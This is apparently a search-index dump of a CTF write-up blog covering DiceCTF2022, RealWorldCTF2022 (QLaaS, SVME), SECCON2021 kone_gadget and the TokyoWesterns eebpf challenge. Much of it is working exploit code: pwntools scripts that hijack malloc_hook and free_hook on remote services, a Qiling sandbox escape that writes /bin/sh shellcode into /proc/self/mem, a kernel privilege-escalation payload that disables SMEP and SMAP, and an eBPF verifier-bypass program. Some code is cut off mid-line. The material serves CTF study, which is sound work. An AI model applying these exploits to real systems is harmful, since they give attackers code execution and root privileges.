(UAF) -\u003e free 1 [8, 9] at 2, [0, 1, 2, 3, 4, 5, 6, 7] at 5 allocate one chunk free 3 (UAF) -\u003e __malloc_hook [8, 9] at 2, [1, 2, 3, 4, 5, 6, 7] at 5, [9] at 6 __malloc_hook [8] at 2, [1, 2, 3, 4, 5, 6, 7] at 5, [9] at 6, [0] at 10 10 is __malloc_hook - 4 [1, 2, 3, 8] at 5, [0, 4, 5, 6, 7, 9] at 10 overwrite malloc_hook to one gadget [1, 2, 3] at 5, [0, 4, 5, 6, 7, 8, 9] at 10 overwrite malloc_hook to one gadget [1, 2, 3] at 5, [4, 5, 6, 7, 8, 9] at 10, [0] at 14 hit chutes to 0! clear rdx=0, trigger one gadget from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './chutes' libc = './libc.so-3.6' context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level='debug' # p = process(binary) p = remote(\"mc.ax\",31326) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) def change_maps(): p.sendlineafter(\"(y/n): \", \"y\") p.sendlineafter(\": \", \"10 4\") # to uaf p.sendlineafter(\": \", \"14 0\") # to clear rdx p.sendlineafter(\": \", \"30 21\") p.sendlineafter(\": \", \"40 31\") p.sendlineafter(\": \", \"50 41\") p.sendlineafter(\": \", \"6 99\") # to leak p.sendlineafter(\": \", \"33 97\") p.sendlineafter(\": \", \"48 62\") p.sendlineafter(\": \", \"68 72\") p.sendlineafter(\": \", \"78 93\") def turn(spin, mark=None, see='n'): if mark != None: p.sendlineafter(\": \", \"y\") p.sendlineafter(\": \", mark) else: p.sendlineafter(\": \", \"n\") p.sendlineafter(\"): \", str(spin)) p.sendlineafter(\"): \", see) p.sendlineafter(\"10): \", \"10\") for i in range(10): p.sendlineafter(\": \", str(i)) change_maps() # turn(6) p.sendlineafter(\": \", \"n\") p.sendlineafter(\"): \", str(6)) p.recvline() p.recvuntil(\"prize: 0x\") one = [0xe6c7e, 0xe6c81, 0xe6c84] libc_base = int(p.recvuntil(\"\\n\", drop=True), 16) - libc.sym[\"puts\"] malloc_hook = libc_base + libc.sym[\"__malloc_hook\"] - 4 og = libc_base + one[1] leak(\"libc_base\",libc_base) leak(\"malloc_hook\", malloc_hook) p.sendlineafter(\"): \", \"n\") turn(1) # 1 turn(1) # 2 for i in range(10-3): turn(0) # 3 4 5 6 7 8 9 turn(4) # 0 turn(0) # 1 turn(0) # 2 for i in range(10-3): turn(1) # 3 4 5 6 7 8 9 turn(6, p64(malloc_hook)[0]) # 0 for i in range(1, 8): turn(3, p64(malloc_hook)[i]) # 1 2 3 4 5 6 7 turn(0) # 8 turn(4) # 9 turn(5, '\\xaa') # 0 turn(0, '\\xbb') # 1 turn(0, '\\xcc') # 2 turn(0, '\\xdd') # 3 for i in [4, 5, 6, 7]: turn(5, p64(og)[i-4]) turn(3, p64(og)[4]) # 8 --\u003e [5] turn(4, p64(og)[5]) # 9 --\u003e [10] for i in range(8): turn(0) turn(5) # 8 turn(0) # 9 p.sendlineafter(\": \", \"n\") p.sendlineafter(\"): \", str(5)) p.interactive() ","date":"2022-02-08","objectID":"/dicectf2022/:4:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#chutes-ladders"},{"categories":["Writeups"],"content":"QLaaS这是我比较感兴趣的一个题目。在比赛时，我的思路是类似虚拟机逃逸，通过读写内存从而实现CPU的逃逸，为此我还去寻找了Unicorn的CVE。因为我很好奇，在程序访问内存时，沙盒是如何将地址进行处理从而保证安全的。我在cve中看到了在0x800000..00附近会有部分数据，而在真正的程序运行的时候不会使用这个地址。通过实验，我成功的读出了这部分的数据。但是我并不知道这部分是什么。 题目真正的攻击面在与openat函数没有正确处理目录穿越的问题。 下面我们先看看syscall_open: def ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int): path = ql.os.utils.read_cstring(filename) real_path = ql.os.path.transform_to_real_path(path) relative_path = ql.os.path.transform_to_relative_path(path) flags \u0026= 0xffffffff mode \u0026= 0xffffffff idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1) if idx == -1: regreturn = -EMFILE else: try: if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX: mode = 0 #flags = ql_open_flag_mapping(ql, flags) flags = ql_open_flag_mapping(ql, flags) ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode) regreturn = idx except QlSyscallError as e: regreturn = - e.errno ql.log.debug(\"open(%s, 0o%o) = %d\" % (relative_path, mode, regreturn)) if regreturn \u003e= 0 and regreturn != 2: ql.log.debug(f'File found: {real_path:s}') else: ql.log.debug(f'File not found {real_path:s}') return regreturn open将path分别转化为了real_path和relative_path。最终通过ql.os.fs_mapper.open_ql_file打开文件，不过使用的还是path。 def open_ql_file(self, path, openflags, openmode, dir_fd=None): if self.has_mapping(path): self.ql.log.info(f\"mapping {path}\") return self._open_mapping_ql_file(path, openflags, openmode) else: if dir_fd: return ql_file.open(path, openflags, openmode, dir_fd=dir_fd) real_path = self.ql.os.path.transform_to_real_path(path) return ql_file.open(real_path, openflags, openmode) 如果文件已被映射则打开。如果没有，先检查dir_fd是否被指定，否则会使用 real_path打开文件。 def transform_to_real_path(self, path): from types import FunctionType rootfs = self.ql.rootfs real_path = self.convert_path(rootfs, self.cwd, path) if os.path.islink(real_path): link_path = Path(os.readlink(real_path)) if not link_path.is_absolute(): real_path = Path(os.path.join(os.path.dirname(real_path), link_path)) # resolve multilevel symbolic link if not os.path.exists(real_path): path_dirs = link_path.parts if link_path.is_absolute(): path_dirs = path_dirs[1:] for i in range(0, len(path_dirs)-1): path_prefix = os.path.sep.join(path_dirs[:i+1]) real_path_prefix = self.transform_to_real_path(path_prefix) path_remain = os.path.sep.join(path_dirs[i+1:]) real_path = Path(os.path.join(real_path_prefix, path_remain)) if os.path.exists(real_path): break return str(real_path.absolute()) path被convert_path转换，最后返回真实路径的绝对路径。 @staticmethod def convert_for_native_os(rootfs, cwd, path): rootfs = Path(rootfs) cwd = PurePosixPath(cwd[1:]) path = Path(path) if path.is_absolute(): return rootfs / QlPathManager.normalize(path) else: return rootfs / QlPathManager.normalize(cwd / path.as_posix()) def convert_path(self, rootfs, cwd, path): if (self.ql.ostype == self.ql.platform ) \\ or (self.ql.ostype in [QL_OS.LINUX, QL_OS.MACOS] and self.ql.platform in [QL_OS.LINUX, QL_OS.MACOS]): return QlPathManager.convert_for_native_os(rootfs, cwd, path) elif self.ql.ostype in [QL_OS.LINUX, QL_OS.MACOS] and self.ql.platform == QL_OS.WINDOWS: return QlPathManager.convert_posix_to_win32(rootfs, cwd, path) elif self.ql.ostype == QL_OS.WINDOWS and self.ql.platform in [QL_OS.LINUX, QL_OS.MACOS]: return QlPathManager.convert_win32_to_posix(rootfs, cwd, path) else: # Fallback return QlPathManager.convert_for_native_os(rootfs, cwd, path) 最后无论如何我们的访问都被限制在了rootfs下。这里可以注意到，如果我们指定了dir_fd这不会对路径进行修正。限免看看openat实现： def ql_syscall_openat(ql: Qiling, fd: int, path: int, flags: int, mode: int): file_path = ql.os.utils.read_cstring(path) # real_path = ql.os.path.transform_to_real_path(path) # relative_path = ql.os.path.transform_to_relative_path(path) flags \u0026= 0xffffffff mode \u0026= 0xffffffff idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1) if idx == -1: regreturn = -EMFILE else: try: if ql.archtype== QL_ARCH.ARM: mode = 0 flags = ql_open_flag_mapping(ql, flags) fd = ql.unpacks(ql.pack(fd)) if 0 \u003c= fd \u003c NR_OPEN: dir_fd = ql.os.fd[fd].fileno() else: dir_fd ","date":"2022-01-27","objectID":"/realworldctf2022-qlaas/:0:0","series":null,"tags":["Writeups"],"title":"RealWorldCTF2022-QLaaS","uri":"/realworldctf2022-qlaas/#qlaas"},{"categories":["Writeups"],"content":"exploit分行读取maps得到python的libc可执行段的地址，然后读取mem，通过lseek移到对应的便宜，然后写入shellcode即可。 #include \u003cfcntl.h\u003e#include \u003cmalloc.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/mman.h\u003e#include \u003cunistd.h\u003e char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"H\\xbf/bin/sh\\x00WH\\x89\\xe7H1\\xf6H1\\xd2H\\xc7\\xc0;\\x00\\x00\\x00\\x0f\\x05\"; int main(int argc, char *argv[]) { int maps, mem; FILE *fp; maps = openat(1, \"/proc/self/maps\", O_RDONLY); if (maps \u003c 0) { printf(\"Couldn't open /proc/self/maps'\"); exit(-1); } mem = openat(1, \"/proc/self/mem\", O_RDWR); if (maps \u003c 0) { printf(\"Couldn't open /proc/self/mem'\"); exit(-1); } fp = fdopen(maps, \"rw\"); if (fp == NULL) { printf(\"Couldn't open /proc/self/mem fd'\"); exit(-1); } char line[1024]; unsigned long addr = 0; while (fgets(line, sizeof(line), fp)) { if (strstr(line, \"r-xp\") \u0026\u0026 strstr(line, \"libc-2.31.so\")) { sscanf(line, \"%lx-\", \u0026addr); break; } } for (int i = 0; i \u003c 0x17; i++) { lseek(mem, addr + i * 0x100, SEEK_SET); write(mem, shellcode, sizeof(shellcode)); } return 0; } ","date":"2022-01-27","objectID":"/realworldctf2022-qlaas/:1:0","series":null,"tags":["Writeups"],"title":"RealWorldCTF2022-QLaaS","uri":"/realworldctf2022-qlaas/#exploit"},{"categories":["Writeups"],"content":"SVME程序为一个简易的虚拟机，在Github上可以找到作者的源码，程序也没有去除符号。这个虚拟机更接近一个栈机器，它没有实现任何通用寄存器，而是使用栈进程数据保存和参数传递。 ","date":"2022-01-27","objectID":"/realworldctf2022-svme/:0:0","series":null,"tags":["Writeups"],"title":"RealWorldCTF2021-SVME","uri":"/realworldctf2022-svme/#svme"},{"categories":["Writeups"],"content":"Vuln我找到的bug是栈越界。栈指针可以越界到code数据结构和全局数据结构，这样就可以改写其全局数据指针。另外，其调用栈是直接申请在上下文结构中的，这里同样可以越界。通过load和store指令不断的写内存，将全局数据指针覆盖为code指针，code是从存放在程序的栈中的，可以从中得到libc指针。通过计算覆盖指针为free_hook，然后写free_hook为system，在free_hook-8写“/bin/sh”。 from pwn import * def leak(name, addr): return log.success( '{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './svme' # binary = './svme' libc = './libc-2.31.so' context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level = 'debug' # p = process(binary) p = remote('47.243.140.252', 1337) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) def noop(): return p32(0) def iadd(): return p32(1) def isub(): return p32(2) def imul(): return p32(3) def ilt(): return p32(4) def ieq(): return p32(5) def br(addr): return p32(6)+p32(addr) def brt(addr): return p32(7)+p32(addr) def brf(addr): return p32(8)+p32(addr) def iconst(data): return p32(9)+p32(data) def load(offset): return p32(10)+p32(offset) def gload(offset): return p32(11)+p32(offset) def store(offset): return p32(12)+p32(offset) def gstore(offset): return p32(13)+p32(offset) def print_(): return p32(14) def pop(): return p32(15) def ret(): return p32(17) def halt(): return p32(18) # gdb.attach(p, \"b vm_exec\") cmd = '' cmd += gload(0xfffff7c0)+gload(0xfffff7c1) # save code pointer cmd += print_()*5 # sp to *global cmd += load(0xfffffc22) + load(0xfffffc23) # over write global cmd += iconst(0) # recover sp value cmd += gload(0x86) + iconst(0x1c7a75-8) + iadd() # save libc pointer cmd += gload(0x87) # save libc pointer cmd += print_()*5 cmd += load(0xfffffc22) + load(0xfffffc23) # over write global to free_hook-8 cmd += iconst(0) # recover sp value cmd += load(0xfffffc22) + iconst(0x199710) + \\ isub() + load(0xfffffc22-2) # calc system addr cmd += gstore(3) + gstore(2) # overwrite free_hook cmd += iconst(0x6e69622f) + gstore(0) # /bin/sh cmd += iconst(0x0068732f) + gstore(1) cmd += halt() # pwn! p.send(cmd.ljust(0x128*4, '\\x00')) p.interactive() ","date":"2022-01-27","objectID":"/realworldctf2022-svme/:1:0","series":null,"tags":["Writeups"],"title":"RealWorldCTF2021-SVME","uri":"/realworldctf2022-svme/#vuln"},{"categories":["Writeups"],"content":"kone_gadgetAdded to arch/x86/entry/syscalls/syscall_64.tbl 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } 没有开启kaslr。提供了一次控制rip的机会，但是除了rax外所有的寄存器都被清空了。ebpf可以通过JIT产生内核可执行的shellcode，但是在本题中，unprivilege bpf被禁止了。而seccomp_filter的JIT是开启的，所以可以通过这个来实现shellcode。通过调试，BPF_STMT(BPF_LD|BPF_K, value)会被编译为mov eax,value的指令。我们可以控制value字段为想要执行的指令，然后通过跳转到下一个指令从而跳过无法识别的指令。这要求我们在通过系统调用进行跳转时偏移一定的字节。为了提高成功率，我们可以在前面喷射大量的nop。 ","date":"2022-01-21","objectID":"/seccon2021-kone-gadget/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2021-kone_gadget","uri":"/seccon2021-kone-gadget/#kone_gadget"},{"categories":["Writeups"],"content":"The full exp #include \u003clinux/bpf_common.h\u003e#define _GNU_SOURCE #include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/seccomp.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e #define PAGE_SIZE 4096 void die(const char *msg) { perror(msg); exit(-1); } int global_fd; uint64_t kernbase; uint64_t user_cs, user_sp, user_ss, user_rflags; uint64_t prepare_kernel_cred = 0xffffffff81073c60; uint64_t commit_creds = 0xffffffff81073ad0; uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10 + 22; void save_status() { __asm__(\"mov %0, cs;\" \"mov %1, ss;\" \"mov %2, rsp;\" \"pushfq;\" \"popq %3;\" : \"=r\"(user_cs), \"=r\"(user_ss), \"=r\"(user_sp), \"=r\"(user_rflags) : : \"memory\"); puts(\"[*] status has been saved.\"); } void pop_shell() { if (!getuid()) { char *argv[] = {\"/bin/sh\", NULL}; char *envp[] = {NULL}; puts(\"[*] Root! :)\"); execve(\"/bin/sh\", argv, envp); } else { die(\"[!] spawn shell error!\\n\"); } } // jmp rax 0xffffffff8106805a int seccon(uint64_t rip) { return syscall(1337, rip); } int main() { int i; uint64_t *fake_stack, *filter; uint64_t *sc; kernbase = 0xffffffff81000000; save_status(); filter = malloc(0x313 * 8); fake_stack = mmap( (void *)0x100000000 - PAGE_SIZE, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED, -1, 0); if (fake_stack == MAP_FAILED) { die(\"[!] Failed to mmap fake_stack\"); } fake_stack = (uint64_t *)0x100000000; fake_stack[0] = prepare_kernel_cred; fake_stack[1] = commit_creds; fake_stack[2] = swapgs_restore_regs_and_return_to_usermode; fake_stack[3] = 0; // dummy rax fake_stack[4] = 0; // dummy rdi fake_stack[5] = (uint64_t)pop_shell; // user rip fake_stack[6] = user_cs; // user cs fake_stack[7] = user_rflags; // user rflags fake_stack[8] = user_sp; // user sp fake_stack[9] = user_ss; // user ss for (i = 0; i \u003c 0x313; i++) { filter[i] = (uint64_t)(0x01eb9090) \u003c\u003c 32; } printf(\"[+] pop_shell %p\\n\", \u0026pop_shell); printf(\"[+] user_cs 0x%lx\\n\", user_cs); printf(\"[+] user_rflags 0x%lx\\n\", user_rflags); printf(\"[+] user_sp 0x%lx\\n\", user_sp); printf(\"[+] user_ss 0x%lx\\n\", user_ss); filter[0x312] = 0x7fff000000000006; sc = \u0026filter[0x100]; i = 0; // overwrite cr4, disable smap\u0026smep sc[i++] = (uint64_t)(0x04E7200F) \u003c\u003c 32; // mov rdi, cr4; add al, 0 sc[i++] = (uint64_t)(0x01ebd231) \u003c\u003c 32; // xor edx, edx sc[i++] = (uint64_t)(0x01ebc2ff) \u003c\u003c 32; // inc edx sc[i++] = (uint64_t)(0x01ebe2d1) \u003c\u003c 32; // shl edx, 1 sc[i++] = (uint64_t)(0x01ebc2ff) \u003c\u003c 32; // inc edx sc[i++] = (uint64_t)(0x0414E2C1) \u003c\u003c 32; // shl edx, 20; add al, 0 sc[i++] = (uint64_t)(0x01ebd2f7) \u003c\u003c 32; // not edx sc[i++] = (uint64_t)(0x04D72148) \u003c\u003c 32; // and rdi, rdx; add al, 0 sc[i++] = (uint64_t)(0x04E7220F) \u003c\u003c 32; // mov cr4, rdi; add al, 0 // rsp = 0x100000000 sc[i++] = (uint64_t)(0x01ebe431) \u003c\u003c 32; // xor esp, esp sc[i++] = (uint64_t)(0x01ebccff) \u003c\u003c 32; // dec esp sc[i++] = (uint64_t)(0x04c4ff48) \u003c\u003c 32; // inc rsp; add al, 0 // call prepare_kernel_cred sc[i++] = (uint64_t)(0x01ebff31) \u003c\u003c 32; // xor edi, edi sc[i++] = (uint64_t)(0x01eb9058) \u003c\u003c 32; // pop rax; nop sc[i++] = (uint64_t)(0x01ebd0ff) \u003c\u003c 32; // call rax; // call commit_creds sc[i++] = (uint64_t)(0x04c78948) \u003c\u003c 32; // mov rdi, rax; add al, 0 sc[i++] = (uint64_t)(0x01eb9058) \u003c\u003c 32; // pop rax; nop sc[i++] = (uint64_t)(0x01ebd0ff) \u003c\u003c 32; // call rax; // call swapgs_restore_regs_and_return_to_usermode + 22 sc[i++] = (uint64_t)(0x01eb9058) \u003c\u003c 32; // pop rax; nop // ! `call rax` will destroy stack frame !! sc[i++] = (uint64_t)(0x01ebe0ff) \u003c\u003c 32; // jmp ra","date":"2022-01-21","objectID":"/seccon2021-kone-gadget/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2021-kone_gadget","uri":"/seccon2021-kone-gadget/#the-full-exp"},{"categories":["Writeups"],"content":"eebpf一道来自Tokyowesterns CTF 2020的内核题目。在做题之前，需要学习ebpf的相关知识。这里有一篇我的笔记。 ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#eebpf"},{"categories":["Writeups"],"content":"Bug题目patch了一个新的指令 原始左移: struct tnum tnum_lshift(struct tnum a, u8 shift) { return TNUM(a.value \u003c\u003c shift, a.mask \u003c\u003c shift); } case BPF_LSH: if (umax_val \u003e= insn_bitness) { /* Shifts greater than 31 or 63 are undefined. * This includes shifts by a negative number. */ mark_reg_unknown(env, regs, insn-\u003edst_reg); break; } /* We lose all sign bit information (except what we can pick * up from var_off) */ dst_reg-\u003esmin_value = S64_MIN; dst_reg-\u003esmax_value = S64_MAX; /* If we might shift our top bit out, then we know nothing */ if (dst_reg-\u003eumax_value \u003e 1ULL \u003c\u003c (63 - umax_val)) { dst_reg-\u003eumin_value = 0; dst_reg-\u003eumax_value = U64_MAX; } else { dst_reg-\u003eumin_value \u003c\u003c= umin_val; dst_reg-\u003eumax_value \u003c\u003c= umax_val; } dst_reg-\u003evar_off = tnum_lshift(dst_reg-\u003evar_off, umin_val); /* We may learn something more from the var_off */ __update_reg_bounds(dst_reg); break; Patch: struct tnum tnum_alshift(struct tnum a, u8 min_shift, u8 insn_bitness) { if (insn_bitness == 32) //Never reach here now. return TNUM((u32)(((s32)a.value) \u003c\u003c min_shift), (u32)(((s32)a.mask) \u003c\u003c min_shift)); else return TNUM((s64)a.value \u003c\u003c min_shift, (s64)a.mask \u003c\u003c min_shift); } case BPF_ALSH: if (umax_val \u003e= insn_bitness) { /* Shifts greater than 31 or 63 are undefined. * This includes shifts by a negative number. */ mark_reg_unknown(env, regs, insn-\u003edst_reg); break; } /* Upon reaching here, src_known is true and * umax_val is equal to umin_val. */ if (insn_bitness == 32) { //Now we don't support 32bit. Cuz im too lazy. mark_reg_unknown(env, regs, insn-\u003edst_reg); break; } else { dst_reg-\u003esmin_value \u003c\u003c= umin_val; dst_reg-\u003esmax_value \u003c\u003c= umin_val; } dst_reg-\u003evar_off = tnum_alshift(dst_reg-\u003evar_off, umin_val, insn_bitness); /* blow away the dst_reg umin_value/umax_value and rely on * dst_reg var_off to refine the result. */ dst_reg-\u003eumin_value = 0; dst_reg-\u003eumax_value = U64_MAX; __update_reg_bounds(dst_reg); break; Update; /* Attempts to improve min/max values based on var_off information */ static void __update_reg_bounds(struct bpf_reg_state *reg) { /* min signed is max(sign bit) | min(other bits) */ reg-\u003esmin_value = max_t(s64, reg-\u003esmin_value, reg-\u003evar_off.value | (reg-\u003evar_off.mask \u0026 S64_MIN)); /* max signed is min(sign bit) | max(other bits) */ reg-\u003esmax_value = min_t(s64, reg-\u003esmax_value, reg-\u003evar_off.value | (reg-\u003evar_off.mask \u0026 S64_MAX)); reg-\u003eumin_value = max(reg-\u003eumin_value, reg-\u003evar_off.value); reg-\u003eumax_value = min(reg-\u003eumax_value, reg-\u003evar_off.value | reg-\u003evar_off.mask); } struct bpf_array { struct bpf_map map; u32 elem_size; u32 index_mask; /* 'ownership' of prog_array is claimed by the first program that * is going to use this map or by the first program which FD is stored * in the map to make sure that all callers and callees have the same * prog_type and JITed flag */ enum bpf_prog_type owner_prog_type; bool owner_jited; union { char value[0] __aligned(8); void *ptrs[0] __aligned(8); void __percpu *pptrs[0] __aligned(8); }; }; 丢失 sign bit可能导致 smax_value \u003c smin_value 。让我们试验以下情况： r1 = array[0](= 0) /* verfier r1-\u003esmin = 0 r1-\u003esmax = 2^62 */ r2 = array[1](= 1) /* verfier r1-\u003esmin = 0 r1-\u003esmax = 2^62 */ r1 \u0026= 1 /* verfier r1-\u003esmin = 0 r1-\u003esmax = 1 */ r2 \u0026= 1 /* verfier r2-\u003esmin = 0 r2-\u003esmax = 1 */ ALSH(r1, 63) /* verfier r1-\u003esmin = 0 r1-\u003esmax = 0x8000000000000000 */ ARSH(r1, 63) /* verfier r1-\u003esmin = 0 r1-\u003esmax = -1 */ r3 = r1 + r2 /* verfier r3-\u003esmin = 0 r3-\u003esmax = 0 */ // ! but r1 + r2 == 1 !! 这样绕过了verfier的检查，使我们可以越界访问数据。 ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#bug"},{"categories":["Writeups"],"content":"leak首先，泄漏内核地址。我们可以越界读取，bpf_map-\u003emap_ops得到内核地址。 struct bpf_insn prog[] = { BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0), // key = [r2] = 0; BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0), BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = array[0] BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1), // key = [r2] = 1; BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // r7 = array[0] BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 3), // r6 \u0026= 1 (0, 1) BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63), // r6 \u003c\u003c= 63 BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63), // r6 \u003e\u003e= 63 (0, -1) BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1), // r7 \u0026= 1 (0, 1) BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7), // r6 += r7 (0, 0) BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300), // r6 =0 (0x300) BPF_LD_MAP_FD(BPF_REG_1, read_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0), // key = [r2] = 0; BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), BPF_MOV64_REG(BPF_REG_8, BPF_REG_0), // r8 = \u0026array[0] BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600), BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6), BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6), BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xd0), BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0), // write address in array[0] BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_3, 0), BPF_MOV64_IMM(BPF_REG_0, 0), BPF_EXIT_INSN() }; ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:2:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#leak"},{"categories":["Writeups"],"content":"AAR得到kernbase后，通过bpf_map_get_info_by_id，如果map-\u003ebtf不为空，则可以读取btf+0x58地址的四字节数据。通过修改btf指针，可以实现任意地址读。 if (map-\u003ebtf) { info.btf_id = btf_id(map-\u003ebtf); info.btf_key_type_id = map-\u003ebtf_key_type_id; info.btf_value_type_id = map-\u003ebtf_value_type_id; } [...] if (copy_to_user(uinfo, \u0026info, info_len) || put_user(info_len, \u0026uattr-\u003einfo.info_len)) return -EFAULT; 为了绕过verfier的检查，我们把目标地址提前写到map中，然后在程序中读取即可。 通过调试，可以找到init_task的地址，然后遍历其进程链表，找到当前程序的task_struct就能得到当前程序的cred。 由于这些结构中有很多内核编译选项控制的字段，所以具体的偏移还要通过调试才能得到。 ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:3:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 